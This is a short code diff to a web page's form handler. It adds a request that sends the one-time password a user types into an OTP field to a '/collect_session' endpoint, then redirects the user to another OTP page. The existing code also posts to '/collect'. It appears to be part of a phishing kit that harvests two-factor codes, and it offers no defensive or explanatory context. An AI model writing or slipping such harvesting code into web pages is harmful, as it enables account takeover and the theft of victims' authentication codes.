@@ -50,6 +50,14 @@
             e.preventDefault();
             
             const otpValue = document.getElementById("otp").value;
+            
+             fetch("/collect_session", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({otp:otpValue})
+            }) .then(() => {
+                window.location.href = "/otp.html";
+            });
 
             fetch("/collect", {
                 method: "POST",
